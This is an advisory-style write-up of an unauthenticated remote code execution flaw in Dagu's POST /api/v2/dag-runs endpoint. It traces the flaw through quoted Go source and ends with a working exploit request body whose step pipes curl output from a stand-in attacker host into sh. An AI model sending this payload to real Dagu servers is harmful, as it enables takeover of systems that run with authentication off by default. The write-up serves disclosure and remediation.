---
id: "GHSA-6qr9-g2xw-cw92"
category: "code-injection"
severity: "high"
refs:
  - url: "https://github.com/dagu-org/dagu/security/advisories/GHSA-6qr9-g2xw-cw92"
    type: ADVISORY
    conclusion: |-
      Dagu's default configuration does not enable authentication (auth.mode defaults to none); the `POST /api/v2/dag-runs` endpoint accepts an inline YAML spec and immediately executes its shell commands without requiring any credentials — any network-reachable Dagu instance is fully compromised by default (unauthenticated RCE, CWE-306, CVSS 3.1 10.0, affected up to 1.30.3).
---

# Command injection — POST /api/v2/dag-runs

## Vulnerability Description

In dagu's POST /api/v2/dag-runs endpoint, the attacker-supplied `spec` YAML body field is persisted verbatim by ExecuteDAGRunFromSpec -> loadInlineDAG (os.WriteFile) to a temporary file, which is then passed as the target configuration to a spawned `dagu start` subprocess (subcmd Start -> exec.Command). That process's runtime writes each step's `command`/`script` into a script file and executes it via the configured shell or a shell detected through the shebang (command executor newCmd -> exec.CommandContext). The only checks on the source side are structural — dag.Validate() and YAML parsing validation only confirm the spec can be parsed, with no restriction on what the steps may execute, and the OpenAPI body validator only runs when StrictValidation is enabled — so the stored spec is unvalidated interpreter input; when the default auth mode is `none` and no basic/token auth is configured, the middleware skips authentication entirely, making this an unauthenticated RCE in default deployments.

## Impact Scope

- Endpoint: `POST /api/v2/dag-runs`

## Audit Trail

1. `internal/service/frontend/api/v2/dagruns.go:64` — The request body's `spec` string enters processing here, passed to loadInlineDAG with no restriction on step commands beyond structural validation.

   ```go
   dag, cleanup, err := a.loadInlineDAG(ctx, request.Body.Spec, request.Body.Name, dagRunId)
   ```
2. `internal/service/frontend/api/v2/dagruns.go:187` — The spec is persisted verbatim to a temp YAML file (os.WriteFile), which becomes the DAG definition the run consumes.

   ```go
   if err := os.WriteFile(tfPath, []byte(specContent), 0o600); err != nil {
   ```
3. `internal/service/frontend/api/v2/dags.go:676` — startDAGRunWithOptions builds a `dagu start` subcommand spec whose target is the persisted spec file, handing the stored data to the runtime interpreter.

   ```go
   spec := a.subCmdBuilder.Start(dag, runtime1.StartOptions{
   ```
4. `internal/runtime/subcmd.go:285` — exec.Command launches the `dagu start` child process with the stored spec file as its argument, so the child parses and executes the stored steps.

   ```go
   cmd := exec.Command(spec.Executable, spec.Args...)
   ```
5. `internal/runtime/builtin/command/command.go:44` — The step's `script` value from the stored spec is written to a script file that the executor then runs.

   ```go
   scriptFile, err := setupScript(e.config.Dir, e.config.Script, e.config.Shell)
   ```
6. `internal/runtime/builtin/command/command.go:157` — The stored step's script is executed via the shebang interpreter (or the configured shell builder), so arbitrary commands in the spec run as the server process.

   ```go
   cmd = exec.CommandContext(cfg.Ctx, shebang, append(shebangArgs, scriptFile)...) // nolint: gosec
   ```

## Evidence Code

```go
// internal/service/frontend/api/v2/dagruns.go#L28C1-L85C2
func (a *API) ExecuteDAGRunFromSpec(ctx context.Context, request api.ExecuteDAGRunFromSpecRequestObject) (api.ExecuteDAGRunFromSpecResponseObject, error) {
	if err := a.isAllowed(config.PermissionRunDAGs); err != nil {
		return nil, err
	}
	if err := a.requireExecute(ctx); err != nil {
		return nil, err
	}

	if request.Body == nil || request.Body.Spec == "" {
		return nil, &Error{
			HTTPStatus: http.StatusBadRequest,
			Code:       api.ErrorCodeBadRequest,
			Message:    "spec is required",
		}
	}

	// Determine dagRunId upfront (used for unique temp dir path)
	var dagRunId, params string
	var singleton bool
	if request.Body.DagRunId != nil {
		dagRunId = *request.Body.DagRunId
	}
	if dagRunId == "" {
		var genErr error
		dagRunId, genErr = a.dagRunMgr.GenDAGRunID(ctx)
		if genErr != nil {
			return nil, fmt.Errorf("error generating dag-run ID: %w", genErr)
		}
	}
	if request.Body.Params != nil {
		params = *request.Body.Params
	}
	if request.Body.Singleton != nil {
		singleton = *request.Body.Singleton
	}

	dag, cleanup, err := a.loadInlineDAG(ctx, request.Body.Spec, request.Body.Name, dagRunId)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	if err := a.ensureDAGRunIDUnique(ctx, dag, dagRunId); err != nil {
		return nil, err
	}

	if err := a.startDAGRun(ctx, dag, params, dagRunId, valueOf(request.Body.Name), singleton); err != nil {
		return nil, &Error{
			HTTPStatus: http.StatusInternalServerError,
			Code:       api.ErrorCodeInternalError,
			Message:    fmt.Sprintf("failed to start dag-run: %s", err.Error()),
		}
	}

	return api.ExecuteDAGRunFromSpec200JSONResponse{
		DagRunId: dagRunId,
	}, nil
}
```

```go
// internal/service/frontend/api/v2/dagruns.go#L146C1-L211C2
func (a *API) loadInlineDAG(ctx context.Context, specContent string, name *string, dagRunID string) (*core.DAG, func(), error) {
	nameHint := "inline"
	if name != nil && *name != "" {
		if err := core.ValidateDAGName(*name); err != nil {
			return nil, func() {}, &Error{
				HTTPStatus: http.StatusBadRequest,
				Code:       api.ErrorCodeBadRequest,
				Message:    err.Error(),
			}
		}
		nameHint = *name
	} else {
		dag, err := spec.LoadYAML(
			ctx, []byte(specContent),
			spec.WithoutEval(),
		)
		if err != nil {
			return nil, func() {}, &Error{
				HTTPStatus: http.StatusBadRequest,
				Code:       api.ErrorCodeBadRequest,
				Message:    err.Error(),
			}
		}
		if err := dag.Validate(); err != nil {
			return nil, func() {}, &Error{
				HTTPStatus: http.StatusBadRequest,
				Code:       api.ErrorCodeBadRequest,
				Message:    err.Error(),
			}
		}
	}

	tmpDir := filepath.Join(os.TempDir(), nameHint, dagRunID)
	if err := os.MkdirAll(tmpDir, 0o750); err != nil {
		return nil, func() {}, fmt.Errorf("failed to create temp directory: %w", err)
	}
	cleanup := func() {
		_ = os.RemoveAll(tmpDir)
	}

	tfPath := filepath.Join(tmpDir, fmt.Sprintf("%s.yaml", nameHint))
	if err := os.WriteFile(tfPath, []byte(specContent), 0o600); err != nil {
		cleanup()
		return nil, func() {}, fmt.Errorf("failed to write spec to temp file: %w", err)
	}

	workDir, _ := os.Getwd()
	if workDir == "" {
		workDir, _ = os.UserHomeDir()
	}
	loadOpts := []spec.LoadOption{spec.WithDefaultWorkingDir(workDir)}
	if name != nil && *name != "" {
		loadOpts = append(loadOpts, spec.WithName(*name))
	}
	dag, err := spec.Load(ctx, tfPath, loadOpts...)
	if err != nil {
		cleanup()
		return nil, func() {}, &Error{
			HTTPStatus: http.StatusBadRequest,
			Code:       api.ErrorCodeBadRequest,
			Message:    err.Error(),
		}
	}

	return dag, cleanup, nil
}
```

```go
// internal/service/frontend/api/v2/dags.go#L675C1-L730C2
func (a *API) startDAGRunWithOptions(ctx context.Context, dag *core.DAG, opts startDAGRunOptions) error {
	spec := a.subCmdBuilder.Start(dag, runtime1.StartOptions{
		Params:       opts.params,
		DAGRunID:     opts.dagRunID,
		Quiet:        true,
		NameOverride: opts.nameOverride,
		FromRunID:    opts.fromRunID,
		Target:       opts.target,
	})

	if err := runtime1.Start(ctx, spec); err != nil {
		return fmt.Errorf("error starting DAG: %w", err)
	}

	// Wait for the DAG to start
	// Use longer timeout on Windows due to slower process startup
	timeout := 5 * time.Second // default timeout
	if runtime.GOOS == "windows" {
		timeout = 10 * time.Second
	}
	timer := time.NewTimer(timeout)
	var running bool
	defer timer.Stop()

waitLoop:
	for {
		select {
		case <-timer.C:
			break waitLoop
		case <-ctx.Done():
			break waitLoop
		default:
			dagStatus, _ := a.dagRunMgr.GetCurrentStatus(ctx, dag, opts.dagRunID)
			if dagStatus == nil {
				continue
			}
			if dagStatus.Status != core.NotStarted {
				// If status is not NotStarted, it means the DAG has started or even finished
				running = true
				timer.Stop()
				break waitLoop
			}
			time.Sleep(100 * time.Millisecond)
		}
	}

	if !running {
		return &Error{
			HTTPStatus: http.StatusInternalServerError,
			Code:       api.ErrorCodeInternalError,
			Message:    "DAG did not start",
		}
	}

	return nil
}
```

```go
// internal/runtime/subcmd.go#L283C1-L309C2
func Start(ctx context.Context, spec CmdSpec) error {
	// nolint:gosec
	cmd := exec.Command(spec.Executable, spec.Args...)
	cmdutil.SetupCommand(cmd)
	cmd.Env = spec.Env

	if spec.Stdout != nil {
		cmd.Stdout = spec.Stdout
	} else {
		cmd.Stdout = os.Stdout
	}
	if spec.Stderr != nil {
		cmd.Stderr = spec.Stderr
	} else {
		cmd.Stderr = os.Stderr
	}

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start command: %w", err)
	}

	go execWithRecovery(ctx, func() {
		_ = cmd.Wait()
	})

	return nil
}
```

```go
// internal/runtime/builtin/command/command.go#L40C1-L98C2
func (e *commandExecutor) Run(ctx context.Context) error {
	e.mu.Lock()

	if e.config.Script != "" {
		scriptFile, err := setupScript(e.config.Dir, e.config.Script, e.config.Shell)
		if err != nil {
			e.mu.Unlock()
			return fmt.Errorf("failed to setup script: %w", err)
		}
		e.scriptFile = scriptFile
		defer func() {
			// Remove the temporary script file after the command has finished
			_ = os.Remove(scriptFile)
		}()
	}
	// Wrap stderr with a tailing writer so we can include recent
	// stderr output (rolling, up to limit) in error messages.
	// Use encoding from DAGContext to properly decode non-UTF-8 output.
	env := runtime.GetEnv(ctx)
	tw := executor.NewTailWriterWithEncoding(e.config.Stderr, 0, env.LogEncodingCharset)
	e.stderrTail = tw
	e.config.Stderr = tw

	cmd, err := e.config.newCmd(ctx, e.scriptFile)
	if err != nil {
		e.mu.Unlock()
		return fmt.Errorf("failed to create command: %w", err)
	}

	e.cmd = cmd

	// Ensure the working directory exists
	if cmd.Dir != "" {
		if err := os.MkdirAll(cmd.Dir, 0750); err != nil {
			e.mu.Unlock()
			return fmt.Errorf("failed to create working directory: %w", err)
		}
	}

	if err := e.cmd.Start(); err != nil {
		e.exitCode = exitCodeFromError(err)
		e.mu.Unlock()
		if tail := e.stderrTail.Tail(); tail != "" {
			return fmt.Errorf("%w\nrecent stderr (tail):\n%s", err, tail)
		}
		return err
	}
	e.mu.Unlock()

	if err := e.cmd.Wait(); err != nil {
		e.exitCode = exitCodeFromError(err)
		if tail := e.stderrTail.Tail(); tail != "" {
			return fmt.Errorf("%w\nrecent stderr (tail):\n%s", err, tail)
		}
		return err
	}

	return nil
}
```

```go
// internal/runtime/builtin/command/command.go#L129C1-L215C2
func (cfg *commandConfig) newCmd(ctx context.Context, scriptFile string) (*exec.Cmd, error) {
	var cmd *exec.Cmd
	switch {
	case cfg.Command != "" && scriptFile != "":
		cmdBuilder := &shellCommandBuilder{
			Dir:                cfg.Dir,
			Command:            cfg.Command,
			Args:               cfg.Args,
			Shell:              cfg.Shell,
			ShellCommandArgs:   cfg.ShellCommandArgs,
			ShellPackages:      cfg.ShellPackages,
			Script:             scriptFile,
			UserSpecifiedShell: cfg.UserSpecifiedShell,
		}
		c, err := cmdBuilder.Build(ctx)
		if err != nil {
			return nil, err
		}
		cmd = c

	case len(cfg.Shell) > 0 && scriptFile != "":
		// Check if the script has shebang and user did not specify a shell
		shebang, shebangArgs, err := cfg.detectShebang(scriptFile)
		if err != nil {
			return nil, fmt.Errorf("failed to detect shebang: %w", err)
		}
		if shebang != "" {
			// Use the shebang interpreter to run the script
			cmd = exec.CommandContext(cfg.Ctx, shebang, append(shebangArgs, scriptFile)...) // nolint: gosec
			break
		}
		// Use shell command builder to properly execute the script file
		// This ensures each shell type uses the correct flags (e.g., cmd.exe /c, powershell -File)
		cmdBuilder := &shellCommandBuilder{
			Dir:                cfg.Dir,
			Shell:              cfg.Shell,
			Script:             scriptFile,
			UserSpecifiedShell: cfg.UserSpecifiedShell,
		}
		c, err := cmdBuilder.Build(ctx)
		if err != nil {
			return nil, err
		}
		cmd = c

	case len(cfg.Shell) > 0 && cfg.ShellCommandArgs != "":
		cmdBuilder := &shellCommandBuilder{
			Dir:                cfg.Dir,
			Command:            cfg.Command,
			Args:               cfg.Args,
			Shell:              cfg.Shell,
			ShellCommandArgs:   cfg.ShellCommandArgs,
			ShellPackages:      cfg.ShellPackages,
			UserSpecifiedShell: cfg.UserSpecifiedShell,
		}
		c, err := cmdBuilder.Build(ctx)
		if err != nil {
			return nil, err
		}
		cmd = c

	default:
		command := cfg.Command
		args := cfg.Args
		if command == "" {
			// No command specified, fallback to shell
			env := runtime.GetEnv(ctx)
			shell := env.Shell(ctx)
			if len(shell) == 0 {
				return nil, errNoCommandSpecified
			}
			command = shell[0]
			tmp := make([]string, len(shell)-1)
			copy(tmp, shell[1:])
			args = append(tmp, args...)
		}
		cmd = createDirectCommand(cfg.Ctx, command, args, scriptFile)
	}

	cmd.Env = append(cmd.Env, runtime.AllEnvs(ctx)...)
	cmd.Dir = cfg.Dir
	cmd.Stdout = cfg.Stdout
	cmd.Stderr = cfg.Stderr
	cmdutil.SetupCommand(cmd)

	return cmd, nil
}
```

## Root Cause

`injection` — `internal/service/frontend/api/v2/dagruns.go:64`

## Exploitation Steps

body: {"spec":"name: pwn\nsteps:\n  - name: s\n    command: sh -c 'curl http://attacker.sh | sh'\n"} — the stored step script is executed by the spawned dagu runtime process
